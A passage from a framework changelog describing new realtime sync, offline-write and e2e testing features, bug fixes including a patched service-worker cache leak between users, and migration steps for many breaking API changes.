    `pg_logical_emit_message(true, 'ultimate.write', <digest>)`, and the replicator asks pgoutput
    for `messages 'true'`. A keyed write outside a transaction is wrapped in one, which is three more
    statements for a write a page is waiting on. A role that may not execute the function is probed
    once per process and its writes go out untagged, never refused.

  Additive to protocol 3, which is unreleased: an older client drops the field. A page served over
  plain HTTP off `localhost` has no `crypto.subtle`, names none of its writes, and keeps the old
  behaviour (`packages/realtime/src/write-echo.test.ts`).
- **Deploys under e2e.**
  - `e2eApp()` returns the spawned app, `{ base, stateDir, stop(), restart(env?) }`. `stop()` is
    final: `restart()` after it throws `X_INVARIANT` rather than spawning a child no later `stop()`
    kills, on a state directory already deleted (`packages/cli/src/e2e-spawn.ts`).
  - The framework's `deploy` fixture offers `newBuild()`, which restarts the app with a new
    `BUILD_ID`. It is registered only when the runner can restart the app
    (`installE2eDriver({ newBuild })`) and is refused by name otherwise.
  - `x dev` honours a set `BUILD_ID`, as `serve.ts` already did.
  - Between tests the preload probes the browser (`answersWithin`) and relaunches one that stopped
    answering.
- **`createContext({ installServices: false })` and `registeredServiceNames()`** in `@ultimat3/core`:
  a context that installs no registered services, and the names `installedServices` would build
  without building them. They are how `@ultimat3/http` binds services lazily, after `auth`.
- **Sign-out clears the browser.** `signOutHeaders({ session?, cookieName? })` in `@ultimat3/auth`
  returns the expired session cookie (when `session` is given) and
  `Clear-Site-Data: "cache", "storage"` (`SIGN_OUT_CLEAR_SITE_DATA`), never `"cookies"`. The browser
  then drops the page store's IndexedDB, local storage, the service worker and its cached pages,
  in a secure context. A PWA's offline cache is reinstalled on the next load, deliberately: a cached
  private page is the previous member's data. The page boot's wipe of other scopes stays as the
  second line.
- **`FRAMEWORK_SCRIPTS` and `FRAMEWORK_INLINE_SCRIPTS`** are exported from `@ultimat3/cli`: the
  scripts `budgets` counts and never charges to the app, because the author cannot edit, delete or
  move them. Today those are the service-worker registration and the no-flash theme script
  (`packages/cli/src/budgets.ts`). The page boot is framework-emitted too and is **charged** to the
  app, by decision: it ships only on a page that hydrates something.
- **HTTP statuses for the plan's new codes** in `@ultimat3/http`'s error map:
  - `X_CLIENT_TRANSPORT_FAILED` and `X_CLIENT_RECORD_ENVELOPE_INVALID` are 502;
  - `X_CLIENT_SCOPE_CHANGED` is 499;
  - the declaration and browser-only codes are 500.
- **The e2e app** runs with `APP_URL` set, `NODE_ENV` stripped and `ULTIMATE_ENV=development`. Its
  readiness is polled over `node:http`, and each e2e test gets 60 s.
- **The `e2e` step drives a real browser against a spawned app.** When Chrome is present,
  `x verify`'s `e2e` step starts the app on a throwaway database (`startE2eApp`, `ULTIMATE_STATE_DIR`)
  and hands the suite a real `page`. Before this, the reference app's e2e suite ran with no browser,
  and its browser cases skipped. New in `@ultimat3/cli`:
  - `startE2eApp`, `e2eBrowser()` and `e2eBaseUrl()`;
  - an e2e session API: `newTab`, `addInitScript`, `offline` (workers included), `setCookie`,
    `sockets()`, `requests()`, `indexedDbNames()` and `waitFor`.

  A spawned app that will not come up is `X_E2E_APP_FAILED`.
- **`ULTIMATE_STATE_DIR`** relocates `.x/` (the embedded database, disk and dev lock) for one
  process tree.
- **One page boot script per private document.** `/_x/page-boot/<hash>.js`, a deferred classic
  script built from `@ultimat3/realtime/boot`, restores the principal's persisted records and opens
  the outbox, once per page. It is rendered only on documents that carry a scope tag and emitted an island reaching
  `@ultimat3/realtime`. Its first job is to wipe every stored scope except the current principal's,
  so a sign-out by full navigation leaves nothing of the previous principal on disk. The worker and
  the boot are resolved from the app root and then from each `apps/*` workspace. Until that fix, a
  workspace app (the reference app included) was served neither. Moving that
  work out of the islands took a `useRecord`-only chunk from 34,838 B to 19,404 B, per
  `packages/realtime/CLAUDE.md`. `X_BUILD_FAILED`'s cause now names `sync worker` or `page boot`
  when a framework script fails to bundle.
- **`useRecords(type, keys)`**, and **`useQuery(ref, input, { first })`** reading in pages, with
  `more()` and `hasMore()` (non-live queries). `recordProjectionForTable(table)` in `@ultimat3/entity`
  and `@ultimat3/entity/record`. `onEnvelope` on `TransportRequest` (core) and on a query client's
  `QueryCallOptions`, which hands a caller the decoded record envelope.
- **`meta.failure` on `X_CLIENT_TRANSPORT_FAILED`**: `'network' | 'status' | 'body'`
  (`TransportFailure` in `@ultimat3/core`), so a caller branches on how the request failed instead
  of on the message.
- **One socket per origin, in a `SharedWorker`.** Every tab of an origin shares one sync socket,
  hosted in a worker named by principal (`socket-engine.ts`, `socket-host.ts`, `sync-worker.ts`).
  Frames are routed only to the ports that want a channel, a port is released on `pagehide`, and a
  silent one is reaped after 3 missed beats. Where `SharedWorker` is absent, the same engine runs
  in the page over a `MessageChannel`. The worker is served at `/_x/sync-worker/<hash>.js`.
- **`useChannel(decl, params, { onEvent, onPresence })` and `usePresence(decl, params)`.** A
  channel's records reach the page's store; its events and rosters reach the handlers. One
  membership per page however many components hold it.
- **Durable offline writes (tier 3).** `entity(name, { persist: true })` records survive a reload
  in IndexedDB, per principal, and are restored before the socket connects. A write the network
  took nothing of is queued and replayed in order over HTTP, with its idempotency key.
- **`release()` on `Mutate`, `MutationQueue` and `Connection`**, the listener a hook installs on the
  page, for `onCleanup`.
- **The manifest lists every realtime channel** (`ChannelFact`: name, params, policy, record types,
  events, catch-up read), read by `describeChannels` on `@ultimat3/realtime/server`. In a contract
  diff, these are **breaking**: a channel removed, its params changed, its policy changed, a record
  type no longer carried, or `events` switched off. A channel added or a record type added is
  additive; a new catch-up read is internal (`packages/manifest/src/diff-channels.ts`).
- **Records answered before the page's store exists are held, not dropped.** The store is installed
  by the first realtime hook, and an action or query can answer earlier than that. In a browser,
  `pageClient()` now holds the latest row per `type:key`, plus the keys removed since, and hands
  them to the store once, when it is installed (`packages/core/src/pending-records.ts`). A
  `rescope()` clears what it holds, because those rows were the previous principal's.
- **A query with an entity `rows:` always answers the record envelope**, even for zero rows. That is
  one response shape per operation, the same rule actions follow, so a generated SDK never has to
  branch on whether rows came back.
- **The framework says where a page's socket dials.** Every document carries
  `<meta name="ultimate-sync">` and `<meta name="x-ultimate-build">`, plus
  `<meta name="ultimate-sync-worker">` when the app has realtime. The target is `/_x/sync` on the
  page's own origin, which `x dev`, a combined-role container and the Helm ingress all serve.
  `SYNC_URL` overrides it, and must be `ws:`/`wss:` or boot fails with `X_CONFIG_INVALID`. **The
  Compose rung needs it set**, because `sync` is published on its own port with nothing in front:
  `SYNC_URL=ws://<host>:3001/_x/sync`. The worker is served `immutable` at
  `/_x/sync-worker/<hash>.js`. Not breaking: the `APP_URL` + 1 port rule was an app file
  (`examples/dummy/apps/web/shared/sync-url.ts`), never framework API, and it keeps working until
  the app deletes it.
- **The client seam in `@ultimat3/core`.**
  - `pageClient()` is the one per-tab handle every island bundle resolves.
  - `clientTransport` is the one browser HTTP function.
  - `actionPath` / `actionRoute` and `queryPath` are the one URL rule, moved from `action` and
    `query`.
  - `OUTBOX_DRAIN_MESSAGE` is what the service worker posts.
  - A raw `ReadableStream` body (`rawBody`) is sent once and never retried, because a stream is
    spent by the first attempt.
  - A `TypeError` thrown by a caller's `onResponse` or `decodeError` hook is the caller's bug and
    reaches the caller as thrown. Only a `fetch` or body read that produced no response is
    `X_CLIENT_TRANSPORT_FAILED` with `meta.failure: 'network'`, so a flight never re-sends a
    request for a hook's own error (`packages/core/src/client-dispatch.ts`).
  - Also new: `AsyncState`, `ConflictPolicy` / `resolveConflict`, the record envelope
    (`RECORDS_HEADER`, `encodeRecordEnvelope`, `decodeRecordEnvelope`) and the scope fence
    (`rescope`, `onRescope`).

  The design is [`docs/architecture/21-client-data-layer.md`](docs/architecture/21-client-data-layer.md),
  and the app-author recipe is [Client data](https://github.com/developerz-ai/ultimate/wiki/Client-Data).
- **`<meta name="ultimate-scope">` on private documents.** `@ultimat3/auth`'s `clientScopeOf(actor)`
  names the principal a per-request page was rendered for. It is an opaque keyed SHA-256, never the
  id, and an impersonating admin gets a scope distinct from the user's own.
  `@ultimat3/render`'s `clientScopeTag` writes it only when the response is `cache-control:
  private` (`documentCarriesScope`), so a shared cache never serves one visitor's scope to the next.
  `pageClient()` reads it once, when the handle is created. An explicit
  `clientScopeOf(actor, { secret })` shorter than 32 characters throws `X_CONFIG_INVALID`, the
  same floor `SESSION_SECRET` is held to, rather than keying the scope with a guessable secret.
- **`entity(name, { persist: true })`.** Declares that a browser keeps this entity's records on
  disk, per principal. Default `false`. It is read into `recordProjection(e).persist`, which
  realtime's persister (`record-persister.ts`) reads: see "Durable offline writes (tier 3)" above.
- **The trace headers a server-side typed call sends onward now come from a slot**, filled by
  `runWithContext` / `startSpan` and never at import. A browser runs neither, so
  `clientTransport` carries no telemetry, context or logger code: 12.9 kB that every island calling
  `rpc()` or `queryClient()` used to pay, per `packages/core/src/outbound-headers.ts`'s header.

- **`rows:` on `query()`: a read whose rows are an entity's answers the record envelope.**
  `query({ …, rows: Post.$schema })` types the key against the row `sql:` returns, so a projection
  cannot claim a full entity's schema. The route then answers `{ data, records }` under
  `x-ultimate-records: 1`, and the page's one record store adopts the rows. Without the key, or
  with a schema carrying no entity brand, the wire is the bare rows it always was. It is a carrier,
  not a switch: `sql:` names its table as a string, so no other declaration holds the schema.

### Fixed

- **e2e: intermittent `X_CDP_TIMEOUT` from spliced WebSocket frames.** Bun 1.4.0's WebSocket client
  spliced large CDP frames together (64 unparseable frames in one run), so their replies were
  dropped. The driver now talks to Chrome over its debugging pipe instead.
- **e2e: a page reloaded under offline emulation read `navigator.onLine` as `true`.** Chrome never
  tells a document created while offline that it is offline. The driver injects an `onLine` override
  while offline, and dispatches exactly one `online` event when the network is restored
  (`packages/cli/src/cdp-e2e-session.ts`, `cdp-offline-script.ts`).
- **Security: the service worker no longer serves one member's page to another.** Its pages cache
  was keyed by URL alone. On a shared browser, a per-member document rendered for one member
  (`stream`, or gated `ssr`, with `offline: 'runtime'`) was served from cache to the next member.
  Now a private document is never answered from cache while online. A document counts as private
  when it is `cache-control: private` or `no-store`, or carries `x-ultimate-scope`. It is kept only
  in its principal's own cache partition, which only the offline path reads. Storing one principal's
  page wipes every other partition, so offline answers only the most recent member's own pages. A
  private document with no scope header is not kept at all. The server stamps
  `x-ultimate-scope: <scope>` on every scope-tagged document (`packages/cli/src/dev-render.ts`); the
  cache facade is `packages/pwa/src/service-worker.ts`. **Affected since 19.0.0**, the first release
  that emits `sw.js`.
- **`idle` hydration kept a click made before the island mounted.** It captures the click and
  replays it once the island has mounted, through the same catch-up `interaction` uses. The replay
  targets the same element structurally, by its path, because the server-rendered node the visitor
  pressed has been replaced by then. A keyboard or scripted click (`detail: 0`) is no longer
  hit-tested at `(0, 0)` (`packages/render/src/hydrate.ts`). The runtime is now 1,744 B for `idle`,
  1,629 B for `interaction` and 846 B for `visible` (`packages/render/CLAUDE.md`).
- **e2e: Chrome's first navigation stalled about 25 s on the Linux keyring**, which surfaced as an
  intermittent `X_CDP_TIMEOUT`. Chrome is now launched with `--password-store=basic` and
  `--use-mock-keychain` (`packages/cli/src/cdp-launch.ts`).
- **A signed-in member's saved locale and time zone now apply.** The `locale` stage ran before
  `auth` and read only the cookie and the headers, so the `user` rung of `resolveLocale` and
  `resolveTimeZone` was never filled (since at least 2.0.0). Once `auth` has run, `@ultimat3/http`
  now re-resolves `ctx.locale`, `ctx.tz` and `content-language` with the actor's preferences, through
  the same owners, so each package's own order still decides (`packages/http/src/stages.ts`). To use
  it, set `locale` and `tz` on the actor your `authenticate` hook returns:
  `userActor({ id, locale, tz })`.
- **The page that installs the service worker is cached on activation.** It loaded before the
  worker controlled it, so no strategy saw it, and an `offline: 'runtime'` route was unavailable
  offline until a second online visit. On `activate`, the worker now runs each open window's URL
  through that route's own strategy (`packages/pwa/src/service-worker.ts`, `warm`).
- **`defineService` services on an HTTP request acted as the anonymous actor, from 13.0.0 until
  now** (commit 753ab6e5, #348). The request context built them before the `auth` stage named
  anyone, so a service closed over `anonymous` for the whole request, whoever had signed in. They
  are now built lazily, per request, on first read, for the authenticated actor, and rebuilt if
  the actor, locale or time zone changes (`packages/http/src/request-services.ts`). An explicit
  `init.services` still overrides the registered one, so a test's mock keeps working.
- **A button-only form posted `400`.** A `<form>` with no fields sends an empty
  `application/x-www-form-urlencoded` or `multipart/form-data` body (`content-length: 0`), which was
  read as no input and failed every schema. An empty form body now reads as `{}`
  (`packages/http/src/request.ts`).

### Changed

- **BREAKING — `AsyncState` is imported from `@ultimat3/core`, not `@ultimat3/ui`.** It is the same
  four-member union (`pending | refreshing | ready | failed`), moved verbatim to
  `packages/core/src/async-state.ts`. realtime's read hooks (tier 3) must return it and ui (tier 4)
  renders it, and neither may import the other. `@ultimat3/ui` no longer re-exports it, so it has
  one home. `AsyncBranch`, `AsyncFlags`, `asyncBranch` and `AsyncRegion` stay in ui. The edit:
  `import type { AsyncState } from '@ultimat3/ui'` → `import type { AsyncState } from '@ultimat3/core'`,
  and add `@ultimat3/core` to that workspace's `dependencies` if it is missing. The compile error
  (`TS2305`) names every site.
- **BREAKING — a mutator's `custom(merge)` receives the local and server ROWS, not the mutator's
  outputs.** Realtime's rebase is the only caller that ever resolves a conflict, and it holds rows.
  So it dropped `@ultimat3/action`'s output-shaped policy without a word (`replayable()` in
  `packages/realtime/src/hooks.ts`) and fell back to its default: a declared merge that never ran.
  `custom()` now builds core's `ConflictPolicy`, `{ kind: 'custom', merge(local: Row, server: Row): Row }`.
  `@ultimat3/action` no longer exports `Conflict`, `CustomConflict`, `resolveConflict` or
  `strategyOf`. The edits:
  - rewrite a `merge` written against the output type so it takes the entity's row:
    `custom<PostRow>((local, server) => …)`. The type argument is a caller-side annotation only.
  - `import { resolveConflict } from '@ultimat3/action'` → `from '@ultimat3/core'`. Its answer is
    typed `Row`, so the caller narrows it.
  - a `conflict.strategy === 'custom'` test → `typeof conflict !== 'string' && conflict.kind === 'custom'`.
  - `strategyOf(c)` → `typeof c === 'string' ? c : c.kind`.

  **One behaviour change raises no compile error.** The old `resolveConflict` answered
  `'last-write-wins'` with the local value every time. Core's keeps the local row only when its
  `updatedAt` is a finite number newer than the server's, which is what realtime's rebase always
  did. A row without a numeric clock now resolves to the server's row.
- **BREAKING — `@ultimat3/realtime` no longer exports `ConflictLike`, `custom`, `CustomMerge`,
  `MergeArgs` or `ConflictStrategy`.** It had its own `custom()`, whose merge took
  `{ local, base, server }`, beside action's. `ConflictLike` accepted both spellings and then
  dropped action's. The rebase now takes core's `ConflictPolicy` and calls core's `resolveConflict`,
  so a custom merge declared on a mutator is actually called. The edits:
  - `ConflictLike` or `ConflictStrategy` imported from `@ultimat3/realtime` →
    `import type { ConflictPolicy } from '@ultimat3/core'`. `CustomMerge` and `MergeArgs` have no
    replacement; the merge is the plain `(local, server) => row` function.
  - `custom(({ local, base, server }) => …)` from realtime → `custom((local, server) => …)` from
    `@ultimat3/action`. There is no `base` any more. Merge against `server`, which is the row the
    other writes produced.
  - a merge that returned `null` to accept a server delete → delete that branch. The merge is no
    longer called when the server deleted the row, or when the client never held a local row. The
    server's answer lands as it is.
  - a merge must return a row with a string `id`. Anything else throws `X_REBASE_CONFLICT` and is
    never written half-way.
- **BREAKING — `isSuperseded(error)` also answers `true` for `X_CLIENT_SCOPE_CHANGED`.** It is
  `@ultimat3/core`'s, and `@ultimat3/action` and `@ultimat3/query` re-export it. A read that was in
  flight when the page changed principal rejects with that code
  (`packages/core/src/client-scope.ts`). Its answer belongs to the previous principal, so it is
  exactly the "drop it and render nothing" case the function exists for
  (`packages/core/src/generation-fence.ts`). The edit: code that branches on `isSuperseded` needs
  nothing. Code that took `isSuperseded(e) === true` to mean `e.code === 'X_SUPERSEDED'` reads
  `e.code` instead.
- **BREAKING — `@ultimat3/query` no longer exports `QueryRequestFailedError` or `QueryProblem`.**
  The typed read client now fails through core's `clientTransport`. A non-2xx body that names a
  framework code is re-thrown as a plain `UltimateError` carrying that code, `meta.origin: 'remote'`.
  A non-2xx with no framework code is `X_CLIENT_TRANSPORT_FAILED`, where it was `X_RPC_FAILED`. The
  edit: `catch (e) { if (e instanceof QueryRequestFailedError) … }` →
  `if (isUltimateError(e)) { switch (e.code) { … } }`, with `isUltimateError` from `@ultimat3/core`.
  Any match on `'X_RPC_FAILED'` for a query becomes `'X_CLIENT_TRANSPORT_FAILED'`. `QueryProblem`
  has no replacement; the server's `cause`, `fix` and `docs` are on the error itself.
- **BREAKING — a typed client's network fault or non-JSON answer is `X_CLIENT_TRANSPORT_FAILED`.**
  This covers `rpc()`, an action's `.client()`, `queryClient()` and a query's `.client()`, and
  `@ultimat3/storage`'s `fetchSignedPut`: the upload fallback `uploadFile()` uses where there is no
  `XMLHttpRequest`. That fallback now goes through `clientTransport` too. A disk that refuses the
  PUT is still `X_STORAGE_UPLOAD_FAILED`, carrying the disk's status. A
  `fetch` that produced no response used to reach the caller as a bare `TypeError`, and a 2xx body
  that was not JSON as a bare `SyntaxError` from `JSON.parse`. Neither carried a code, a cause or
  a `fix:`. Both are now `X_CLIENT_TRANSPORT_FAILED`. So is an action's non-2xx whose body names no
  framework code, which was `X_RPC_FAILED`: a gateway's HTML now reads the same from an action and
  from a query. It is `retryable` for a read, and for a write carrying an `idempotencyKey`, and not
  for an unkeyed write, which may have landed. `RpcFailedError` stays exported and `X_RPC_FAILED`
  stays registered, because a shipped code never changes, but nothing in the framework throws
  either now. The edit: `instanceof TypeError`, `instanceof SyntaxError`,
  `instanceof RpcFailedError` and `e.code === 'X_RPC_FAILED'` all become
  `isUltimateError(e) && e.code === 'X_CLIENT_TRANSPORT_FAILED'`. A server's own code
  (`RemoteActionError`) and version skew (`X_CONTRACT_DRIFT`) are unchanged.
- **BREAKING — an action whose output references an entity row answers `{ data, records }`, with
  `x-ultimate-records: 1`.** The rows under `data` are also sent, keyed by record type, so the
  page's one record store adopts them. Which actions do this is decided from the output schema at
  projection, never per response (`packages/action/src/record-wire.ts`). Every other action's
  body is byte-identical. The OpenAPI `200` of those actions changes the same way: an object with
  a required `data` holding the declared output, a required `records` (possibly empty), an
  optional `removed` (core's `recordEnvelopeSchema`), and the
  required `x-ultimate-records` response header. The typed clients strip the envelope, so
  `rpc()` and `.client()` return what they always did. The edit applies only to a client that is
  not `@ultimat3/*`: a generated SDK, `curl` in a script, a test posting with `fetch`. When the
  response carries `x-ultimate-records: 1`, read the output from `body.data`. Regenerate an SDK
  from the new `openapi.json`.
- **BREAKING — the service worker no longer POSTs `/_x/outbox/flush`; it tells the open tabs to
  drain.** `@ultimat3/pwa` removes `DEFAULT_FLUSH_ENDPOINT`, `BackgroundSyncOptions` and
  `ServiceWorkerConfig.backgroundSync`, and `backgroundSyncSource()` takes no arguments. Nothing in
  the framework ever mounted the flush route, so no background sync ever reached a handler. The outbox is
  `@ultimat3/realtime`'s and lives in the page, which holds the store, the principal and
  `clientTransport`. On a `sync` event the worker therefore posts `OUTBOX_DRAIN_MESSAGE`
  (`'x-outbox-drain'`, from `@ultimat3/core`) to every open window, and does nothing when no window
  is open: the queue stays on disk, and the next page load replays it. `pwa.backgroundSync: true`
  in `app.config.ts` is unchanged. The edits:
  - delete `backgroundSync: { flushEndpoint }` from any `generateServiceWorker({ … })` call.
  - delete `DEFAULT_FLUSH_ENDPOINT` and `BackgroundSyncOptions` imports.
  - `backgroundSyncSource(opts)` → `backgroundSyncSource()`.
  - delete any `/_x/outbox/flush` route an app mounted itself.

  `X_PWA_SYNC_FLUSH_FAILED` and `X_PWA_SYNC_INCOMPLETE` stay registered, because a shipped code
  never changes meaning, and an old log still explains itself. But nothing throws either now, so
  code that matches on them compiles and **never matches**. Delete those branches.
- **BREAKING — `ClientScope.principal` is `string | null | undefined`.** `undefined` is a new
  third answer: an **unscoped** page, rendered for nobody. That is a shared, cacheable document
  carrying no `<meta name="ultimate-scope">`, and nothing is persisted for it. `null` is still the
  anonymous visitor. The edit: code that narrowed with `principal !== null` and then used the
  result as a `string` now fails to compile. Test `typeof principal === 'string'` instead, and
  decide what the unscoped page does. A `switch` that handled `null` and `string` needs an
  `undefined` arm.
- **BREAKING — `mutator({ conflict: 'last-write-wins' })` throws `X_MUTATOR_CLOCK_MISSING` at
  declaration unless it can compare clocks.** Every entity row in the mutator's output must carry a
  **number** `updatedAt` column (epoch ms, written by the server). A `timestamp()` string column does
  not count. An output with no entity row fails too. Without a clock, core's `resolveConflict` can
  never prove the local row newer, so the server row won every time: `'last-write-wins'` silently
  meant `'server-wins'`, which `examples/dummy`'s `setTheme` shipped
  (`packages/action/src/mutator-clock.ts`). The edit is either one:
  - add `updatedAt` as a number column the server writes on every update to that entity.
  - declare `conflict: 'server-wins'`, which is what the mutator was doing anyway.
- **BREAKING — the app no longer builds or registers a live client.** `@ultimat3/realtime` no
  longer exports `setLiveClient`, `clearLiveClient`, `hasLiveClient`, `LiveClient`,
  `LiveClientLike`, `LiveClientOptions`, `ClientSocket` or `MutatorRef` from `'.'`. The page has one
  socket (`packages/realtime/src/page-socket.ts`), opened by the first live hook, dialling the
  document's `<meta name="ultimate-sync">` (or `SYNC_URL`). An island installs its signal factory
  with `installRealtime({ signal: createSignal })`; a browser hook in a bundle that never did is
  `X_REALTIME_UNINSTALLED`. `X_LIVE_CLIENT_MISSING` stays registered and is thrown by nothing. The
  edits:
  - delete the app's socket adapter (`shared/live-socket.ts`), its sync-URL module, the
    `new LiveClient(…)`, `client.connect()` and `setLiveClient(client)` in each island's `mount`.
  - add `installRealtime({ signal: createSignal })` in that `mount`, before the first render.
  - `hasLiveClient()` → `hasPageSocket()`, the guard an offline banner or an update prompt asks.
  - `client.subscribe(topic, handler)` / `client.publish(topic, …)` → `useChannel(decl, params, { onEvent, onPresence })`
    or `usePresence(decl, params)` on a `channel()` declaration. A client never publishes.
- **BREAKING — one read hook: `useQuery(ref, input)`.** `useLive`, `LiveRows`, `LiveInput`,
  `liveHookFor`, `LiveQueryHook` and `LiveQuerySource` are deleted. `useQuery({ name, live: true }, input)`
  returns an `AsyncState` accessor (`pending | refreshing | ready | failed`) where `useLive` returned
  rows plus `.state()`. A non-live query uses the same hook: name its `entity` to make the rows store
  records. `X_QUERY_NOT_SUBSCRIBABLE` stays registered and is thrown by nothing. The edits:
  - `useLive<Row>({ name }, input)` → `useQuery<Row>({ name, live: true }, input)`.
  - `feed.state() === 'live'` → `feed().status === 'ready'`.
  - `feed()` (the rows) → `feed().data`, once the status is `ready` or `refreshing`.
  - `feed.unsubscribe()` → `feed.release()`.
  - `const useX = liveHookFor(query)` → delete it and call `useQuery` with the query's name.
- **BREAKING — `IdentityMap` is `RecordStore`, keyed `type:key`.** `IdentityMap`, `privateScope`,
  `rowKey`, `RowScope`, `RowKey` and `IdentityListener` are gone. Their replacements are
  `RecordStore`, `recordKey`, `RecordKey` and `RecordListener` (`packages/realtime/src/record-store.ts`).
  A record's key comes from the server, never a per-query scope. The edit: rename the imports.
  `rowKey(scope, id)` → `recordKey(type, key)`. Code that read the map directly reads one record
  with `useRecord(type, key)`.
- **BREAKING — the 20.x local store and rebase log are deleted.** `MemoryLocalStore`,
  `createOpfsLocalStore`, `LocalStore`, `OpfsLocalStoreOptions`, `RebaseLog`, `RebaseEntry`,
  `reconcile`, `ReconcileOptions`, `ReconcileResult`, `ServerAck`, `rebaseFrame`, `strategyName`,
  `mutateFrame`, `MutateFrame`, `RebaseFrame`, `ConflictStrategyName` and `serverRenderLiveClient`
  are gone. The optimistic apply they gated now needs nothing: `useMutation` writes the mutator's
  `local` twin into the record store's overlay. Durable offline writes are IndexedDB plus one
  outbox (see "Durable offline writes (tier 3)" under Added). The edits:
  - delete the `store`, `queue` and `log` you passed to `new LiveClient(…)`, and any
    `new MemoryLocalStore()`.
  - to keep an entity's records across a reload, declare it `entity(name, { persist: true })`.
    A write that got no response is queued and replayed by the page's outbox with no declaration.
- **BREAKING — `useMutation` writes over HTTP and resolves with the action's output.** It posts
  `actionPath(mutator.name)` through `clientTransport` with an idempotency key, where it used to
  send a socket `mutate` frame that no host ever answered (`X_NOT_IMPLEMENTED`). The call now
  resolves with the output, where it resolved `void`. The one exception is a write that got **no
  response at all** (`X_CLIENT_TRANSPORT_FAILED` with `meta.failure: 'network'`): the call resolves
  `undefined`, and the write is queued in the page's outbox with its overlay kept, to be replayed.
  A `'status'` failure rejects and drops the overlay. A `'body'` failure (a 2xx that was not JSON,
  which may have landed) rejects and keeps the overlay until the next server row it touched. `useMutationQueue()` keeps `pending` and
  `failed` and loses `drain()`, because there is no socket queue to drain. `MutatorLike.entity` is
  gone. The edits:
  - delete `useMutationQueue().drain()` calls.
  - delete `entity:` from `MutatorLike` literals.
  - read the answer where you used to re-query for it: `const row = await like({ postId })`.
- **BREAKING — sync protocol 3.** The `mutate` and `rebase` frame kinds are deleted, and so are
  `createSyncNode({ onMutate })` and `MutationHandler`. `ack` now only answers a refusal. `records`,
  `events` and `replay-gap` are new. A v2 client and a v3 node refuse each other with
  `X_PROTOCOL_VERSION`. The edits:
  - delete `onMutate` from `createSyncNode({ … })`.
  - redeploy clients and `sync` nodes together.
- **BREAKING — `topic` and `Topic` moved from `@ultimat3/realtime/server` to `@ultimat3/realtime`.**
  A channel topic is spelled by a `channel()` declaration, which browser code needs as much as
  server code. The edit: `import { topic } from '@ultimat3/realtime/server'` →
  `from '@ultimat3/realtime'`.
- **BREAKING — a Compose deploy refuses to start without `SYNC_URL`.** `docker/docker-compose.prod.yml`,
  `x new`'s scaffold and both tracked apps now pass
  `SYNC_URL: ${SYNC_URL:?set SYNC_URL=ws://<host>:3001/_x/sync, see wiki/Deployment.md}` to `web`.
  On that rung `sync` is published on its own port with nothing in front, so the default
  `/_x/sync` dialled `web`'s port, which does not serve the socket: a page with realtime connected
  to nothing, with no error anywhere. The edit: set `SYNC_URL=ws://<host>:3001/_x/sync` in
  `.env.production` and pass `--env-file .env.production` to a hand-run `docker compose`, or put a proxy in front that routes `/_x/sync` to `sync` and set
  `SYNC_URL=wss://<host>/_x/sync`. An app that copied the old compose file adds the same
  `environment` line to `web`.
- **`x deploy --method compose` passes `--env-file <app root>/.env.production` on every step**,
  before `-f` (`packages/cli/src/cmd-deploy.ts`, `PROD_ENV_FILE`). Compose fills `${VAR:?…}` from
  the shell and `--env-file` only, never from a service's `env_file:`. So a `SYNC_URL` or
  `POSTGRES_PASSWORD` set only in `.env.production`, the file the compose header says to fill,
  failed every step on a parse error. A variable set in the shell still wins. Not breaking: a
  deploy that exported the variables keeps working unchanged.
- **BREAKING — `x verify --json`'s `data.durationMs` is wall time, not the sum of step times.** The
  static steps (`lint`, `boundaries`, `filesize`, `package-shape`, `errors`) now run beside the
  serial suites (`live`, `job`, `e2e`, `eval`), so the sum overstates the run
  (`packages/cli/src/verify-run.ts`). Each step's own `durationMs` is unchanged. The edit: a
  dashboard that summed the steps to get the run, or read `data.durationMs` as that sum, now reads
  `data.durationMs` as the wall clock.
- **BREAKING — the `presence` sync frame and `PresenceFrame` are removed.** A roster now arrives as
  an `events` frame on its channel, `{ presence: op, members, total? }`, where `op` is
  `join | leave | update | sync`. That is one frame kind for everything ephemeral, carried by a
  declaration rather than beside it. The edits:
  - declare the room with `channel(name, { …, events: true })`.
  - read the roster with `readPresence(frame.event)` in that channel's events handler; it answers
    `null` for an ordinary event.
- **BREAKING — a channel hub serves declared channels only.** Removed:
  - `ChannelHub#guard`, `subscribe(socket, topic)`, `publish(topic, …)` and `publishFrame`;
  - `channelFrame`, `TopicGuard`, `TopicGuardArgs` and `TopicGuardResult`;
  - the `nodeId` option;
  - the `{ kind: 'topic' }` subscribe target.

  A raw topic string was a second way to name a channel, so a publisher and a subscriber could
  drift onto two spellings with no error on either side. The edits:
  - declare each channel once: `channel(name, { params, policy, row?, catchUp, records?, events? })`
    from `@ultimat3/realtime`. It registers itself.
  - construct the hub as `new ChannelHub({ transport, sockets })`; it serves every declared channel.
  - `hub.guard(pattern, fn)` → the declaration's `policy` (plus `row` for the subject it decides
    about).
  - `hub.publish(topic, event)` → `hub.publishEvent(decl, params, event)`.
  - delete `nodeId`.

  An undeclared name is `X_TOPIC_FORBIDDEN`.
- **BREAKING — a mutator's `local` tables are addressed by record key.** `@ultimat3/action`'s
  `LocalTable` is now `get(key)`, `all()`, `insert(key, row)`, `upsert(key, row)`,
  `update(key, patch | fn)` and `delete(key)`, where it was `insert(row)`, `update(id, …)` and
  `delete(id)` over a `LocalRow` with an `id`. `LocalRow` is removed. `LocalTable` is the same shape
  as realtime's store transaction (`packages/realtime/src/record-tx.ts`), so a twin typed against
  it runs against the page's record store unchanged. The store keys a record by its entity's primary
  key, which a browser cannot derive from a row. The edits:
  - `tx.posts.insert(post)` → `tx.posts.insert(post.id, post)`, and the same for `upsert`.
  - `LocalTable<LocalRow & Post>` → `LocalTable<Post>`.

  Every site is a compile error.
- **BREAKING — `cdpE2ePage` and `CdpE2ePageOptions` are removed from `@ultimat3/cli`.** An e2e page
  now belongs to a session that can open further tabs in the same browser profile, which a page
  created on its own could not. The edits:
  - `cdpE2ePage(opts)` → `openE2eBrowser()` and its page tab, or `session.newTab()` for another tab
    in the same profile.
  - a tab on an existing connection → `cdpE2eTab({ … })`.
- **BREAKING — a `.x/build-stats.json` written before 21.0.0 is stale.** The file now records the
  measurement rules that wrote it (`measuredBy`), and the `budgets` step reads only a file written
  under the current rules (`BUILD_STATS_RULES = 2`, `packages/cli/src/budgets.ts`). Version 2 exempts
  the service-worker registration (`FRAMEWORK_SCRIPTS`) and records the decision to charge the page
  boot. Until the next build, every budgeted route reads `X_BUDGET_UNMEASURED` ("written by an
  earlier measurement rule than this gate's (v2)"), because `.x/` survives upgrades and an old file
  charged, for example, 250 B for `/x-sw-register.js`. The edit: run `x build --target static`
  again, then `x verify`.
- **BREAKING — `hasPageSocket()` no longer exempts a module from `X_LIVE_ROUTE_NO_ISLAND`.** The
